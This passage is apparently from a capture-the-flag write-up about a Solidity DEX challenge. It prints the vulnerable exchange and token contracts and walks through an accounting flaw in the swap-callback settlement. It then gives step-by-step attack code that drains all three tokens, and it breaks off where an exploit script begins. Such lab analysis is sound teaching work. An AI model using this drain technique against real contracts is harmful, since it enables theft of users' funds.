&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        SwapCallback(msg.sender).doSwap();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(swapState.unsettledTokens == 0, &amp;quot;not settled&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        nonce += 1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function updatePosition(address token, int256 amount) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        int256 currentPosition = swapState.positions[token];
&lt;&#x2F;span&gt;&lt;span&gt;        int256 newPosition = currentPosition + amount;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (newPosition == 0) swapState.unsettledTokens -= 1;
&lt;&#x2F;span&gt;&lt;span&gt;        else if (currentPosition == 0) swapState.unsettledTokens += 1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        swapState.positions[token] = newPosition;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function withdraw(address token, uint256 amount) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Token(token).transfer(msg.sender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;        updatePosition(token, -int256(amount));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function initiateTransfer(address token) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;        SavedBalance storage state = swapState.savedBalances[token];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(!state.initiated, &amp;quot;transfer already initiated&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        state.initiated = true;
&lt;&#x2F;span&gt;&lt;span&gt;        state.balance = Token(token).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function finalizeTransfer(address token) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;        SavedBalance storage state = swapState.savedBalances[token];
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(state.initiated, &amp;quot;transfer not initiated&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 balance = Token(token).balanceOf(address(this));
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount = balance - state.balance;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        state.initiated = false;
&lt;&#x2F;span&gt;&lt;span&gt;        updatePosition(token, int256(amount));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[tokenIn], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowedTokens[tokenOut], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(liquidityBefore &amp;gt; 0, &amp;quot;no liquidity&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        setReserves(tokenIn, tokenOut, newReservesIn);
&lt;&#x2F;span&gt;&lt;span&gt;        setReserves(tokenOut, tokenIn, newReservesOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        updatePosition(tokenIn, -int256(amountIn));
&lt;&#x2F;span&gt;&lt;span&gt;        updatePosition(tokenOut, int256(amountOut));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        require(liquidityAfter &amp;gt;= liquidityBefore, &amp;quot;insufficient liquidity&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Token {
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 public totalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; uint256) balances;
&lt;&#x2F;span&gt;&lt;span&gt;    mapping(address =&amp;gt; mapping(address =&amp;gt; uint256)) allowed;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    constructor(uint256 _initialAmount) {
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg.sender] = _initialAmount;
&lt;&#x2F;span&gt;&lt;span&gt;        totalSupply = _initialAmount;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function balanceOf(address _owner) public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return balances[_owner];
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function transfer(address _to, uint256 _value) public returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(balances[msg.sender] &amp;gt;= _value);
&lt;&#x2F;span&gt;&lt;span&gt;        balances[msg.sender] -= _value;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[_to] += _value;
&lt;&#x2F;span&gt;&lt;span&gt;        return true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(allowed[_from][msg.sender] &amp;gt;= _value);
&lt;&#x2F;span&gt;&lt;span&gt;        require(balances[_from] &amp;gt;= _value);
&lt;&#x2F;span&gt;&lt;span&gt;        balances[_to] += _value;
&lt;&#x2F;span&gt;&lt;span&gt;        balances[_from] -= _value;
&lt;&#x2F;span&gt;&lt;span&gt;        allowed[_from][msg.sender] -= _value;
&lt;&#x2F;span&gt;&lt;span&gt;        return true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function approve(address _spender, uint256 _value) public returns (bool) {
&lt;&#x2F;span&gt;&lt;span&gt;        allowed[msg.sender][_spender] = _value;
&lt;&#x2F;span&gt;&lt;span&gt;        return true;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-7&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-7&quot; aria-label=&quot;Anchor link for: solution-7&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;What does this protocol is doing? Let&#x27;s break it down&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Setup Contract&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Initializes the exchange with initial liquidity&lt;&#x2F;li&gt;
&lt;li&gt;Creates three tokens (token1, token2, token3) with balances:
&lt;ul&gt;
&lt;li&gt;token1: 300,000 tokens&lt;&#x2F;li&gt;
&lt;li&gt;token2: 300,000 tokens&lt;&#x2F;li&gt;
&lt;li&gt;token3: 600,000 tokens&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Adds initial liquidity pairs:
&lt;ul&gt;
&lt;li&gt;token1&#x2F;token2: 100,000 each&lt;&#x2F;li&gt;
&lt;li&gt;token1&#x2F;token3: 100,000&#x2F;200,000&lt;&#x2F;li&gt;
&lt;li&gt;token2&#x2F;token3: 100,000&#x2F;200,000&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Exchange Contract&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Core DEX functionality with unique swap mechanism&lt;&#x2F;li&gt;
&lt;li&gt;Key components:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Pool&lt;&#x2F;code&gt;: Tracks reserves for token pairs&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;SwapState&lt;&#x2F;code&gt;: Manages ongoing swap states and positions&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;SavedBalance&lt;&#x2F;code&gt;: Tracks balance snapshots during swaps&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Main functions:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;addLiquidity()&lt;&#x2F;code&gt;: Add tokens to pools&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;swap()&lt;&#x2F;code&gt;: Initiates a swap transaction&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;swapTokens()&lt;&#x2F;code&gt;: Performs the actual token swap&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;withdraw()&lt;&#x2F;code&gt;: Withdraws tokens during a swap&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;initiateTransfer&#x2F;finalizeTransfer&lt;&#x2F;code&gt;: Two-step transfer process&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;As usual what&#x27;s the initial state of the protocol??&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Player&lt;&#x2F;span&gt;&lt;span&gt; :  0xa7048127553Ead5D0408B3C8C068565d1cD46BDb
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Setup&lt;&#x2F;span&gt;&lt;span&gt; :  0xd9beE8f7dF07fd718f54ed05CAD77FC0EF1F9A7B
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Exchange&lt;&#x2F;span&gt;&lt;span&gt; :  0xb3CE3E482D1caf5b444f3f6b95a9d8799f6dac11
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Token1&lt;&#x2F;span&gt;&lt;span&gt; :  0xa95A2a693880626911bb521CB50b7DC7Caa0EC05
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Token2&lt;&#x2F;span&gt;&lt;span&gt; :  0x601C3EA942c5Eae7301C39c95342307a17cEc0B7
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Token3&lt;&#x2F;span&gt;&lt;span&gt; :  0xd5e4b9f37E1b51D18CD2f281B85DCDC07b4540a1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSolved&lt;&#x2F;span&gt;&lt;span&gt;() :  false
&lt;&#x2F;span&gt;&lt;span&gt;Exchange balance Token1 :  200000
&lt;&#x2F;span&gt;&lt;span&gt;Exchange balance Token2 :  200000
&lt;&#x2F;span&gt;&lt;span&gt;Exchange balance Token3 :  400000
&lt;&#x2F;span&gt;&lt;span&gt;Player balance Token1 :  0
&lt;&#x2F;span&gt;&lt;span&gt;Player balance Token2 :  0
&lt;&#x2F;span&gt;&lt;span&gt;Player balance Token3 :  0
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Okay, Goal is to drain all tokens from the exchange. Lets do this.&lt;&#x2F;p&gt;
&lt;p&gt;We need to find the function where the token amount is being sent to us. It is the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function withdraw(address token, uint256 amount) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;    require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Token(token).transfer(msg.sender, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    updatePosition(token, -int256(amount));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The withdraw function is optimistically sending the amount we are requesting directly to the caller and then updating the position, but first of all the swap should begin (&lt;code&gt;duringSwap&lt;&#x2F;code&gt;). For this we can call &lt;code&gt;swap()&lt;&#x2F;code&gt; functions to start the swap.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function swap() external {
&lt;&#x2F;span&gt;&lt;span&gt;    SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    require(!swapState.hasBegun, &amp;quot;swap already in progress&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    swapState.hasBegun = true;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    SwapCallback(msg.sender).doSwap();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    require(swapState.unsettledTokens == 0, &amp;quot;not settled&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    nonce += 1;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;If we call the &lt;code&gt;swap()&lt;&#x2F;code&gt; function it will callback the &lt;code&gt;doSwap()&lt;&#x2F;code&gt; function on the caller. So, Now we can call the &lt;code&gt;withdraw()&lt;&#x2F;code&gt; function inside the callback of &lt;code&gt;doSwap()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s see what happens if we withdraw all the &lt;code&gt;200000&lt;&#x2F;code&gt; tokens of &lt;code&gt;Token1&lt;&#x2F;code&gt;. The withdraw function will send all the &lt;code&gt;200000&lt;&#x2F;code&gt; token1 to us but it updates our position.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;withdraw( token1, 200000 ) {
&lt;&#x2F;span&gt;&lt;span&gt;    Token(token).transfer(msg.sender, 200000);
&lt;&#x2F;span&gt;&lt;span&gt;    updatePosition(token1, -int256(200000));
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;function updatePosition(address token, int256 amount) internal {
&lt;&#x2F;span&gt;&lt;span&gt;    require(allowedTokens[token], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    SwapState storage swapState = getSwapState();
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    int256 currentPosition = swapState.positions[token];
&lt;&#x2F;span&gt;&lt;span&gt;    int256 newPosition = currentPosition + amount;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    if (newPosition == 0) swapState.unsettledTokens -= 1;
&lt;&#x2F;span&gt;&lt;span&gt;    else if (currentPosition == 0) swapState.unsettledTokens += 1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    swapState.positions[token] = newPosition;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now our newPosition becomes &lt;code&gt;200000&lt;&#x2F;code&gt; and the &lt;code&gt;swapState.unsettledTokens = 1&lt;&#x2F;code&gt; will be updated. So, we need to settle these &lt;code&gt;unsettledTokens&lt;&#x2F;code&gt; before completing this swap. If we observe the &lt;code&gt;swapTokens()&lt;&#x2F;code&gt; function where we can do swap and the positions are also being updated there.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
&lt;&#x2F;span&gt;&lt;span&gt;    require(allowedTokens[tokenIn], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    require(allowedTokens[tokenOut], &amp;quot;token not allowed&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    require(liquidityBefore &amp;gt; 0, &amp;quot;no liquidity&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    setReserves(tokenIn, tokenOut, newReservesIn);
&lt;&#x2F;span&gt;&lt;span&gt;    setReserves(tokenOut, tokenIn, newReservesOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    updatePosition(tokenIn, -int256(amountIn));
&lt;&#x2F;span&gt;&lt;span&gt;    updatePosition(tokenOut, int256(amountOut));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    require(liquidityAfter &amp;gt;= liquidityBefore, &amp;quot;insufficient liquidity&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The &lt;code&gt;amountIn&lt;&#x2F;code&gt; to the &lt;code&gt;swapTokens()&lt;&#x2F;code&gt; will be deducted from the current position.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;    updatePosition(tokenIn, -int256(amountIn));
&lt;&#x2F;span&gt;&lt;span&gt;    updatePosition(tokenOut, int256(amountOut));
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So lets do these steps,&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;solidity&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-solidity &quot;&gt;&lt;code class=&quot;language-solidity&quot; data-lang=&quot;solidity&quot;&gt;&lt;span&gt;Attack1.doSwap() {
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.withdraw(address(token1), 200000);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; 200000 token1 drained
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() in withdraw:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition = 0 - 200000 = -200000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token1] = -200000
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.swapTokens(address(token1), address(token2), 200000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token1 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = -200000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  -200000 + (-200000)= -400000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token1] = -400000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token2 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  0 + 0 = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 0 (newPosition==0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token2] = 0 (because amountOut = 0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; @notice: Here we can observe some inconsistency between state postions and unsettled tokens.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.withdraw(address(token2), 200000);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; 200000 token2 drained
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() in withdraw:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition = 0 - 200000 = -200000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1 (currentPosition==0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token2] = -200000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.swapTokens(address(token2), address(token3), 200000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token2 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = -200000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  -200000 + (-200000)= -400000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token2] = -400000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token3 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  0 + 0 = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 0 (newPosition==0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token3] = 0 (because amountOut = 0)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attack2.doSwap(){
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.withdraw(address(token3), 400000);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; 400000 token3 drained
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() in withdraw:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition = 0 - 400000 = -400000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1 (currentPosition==0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token3] = -400000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    exchange.swapTokens(address(token3), address(token1), 400000, 0);
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token3 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = -400000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  -400000 + (-400000)= -800000
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 1 (currentPosition!=0 || newPosition!=0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token3] = -800000
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; updatePosition() for token1 in swapTokens:
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - currentPosition = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - newPosition =  0 + 0 = 0
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.unsettledTokens = 0 (newPosition==0)
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&#x2F; - swapState.positions[token1] = 0 (because amountOut = 0)
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Don&#x27;t ask me anything please follow the math explained above. Th issues I see here are,&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Allowing withdraw() during swap&lt;&#x2F;li&gt;
&lt;li&gt;nonce being updated after the swap&lt;&#x2F;li&gt;
&lt;li&gt;Inconsistency between &lt;code&gt;swapState.positions&lt;&#x2F;code&gt; and &lt;code&gt;swapState.unsettledTokens&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Only handling the cases where the &lt;code&gt;currentPosition == 0 || newPosition == 0&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Exchange.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
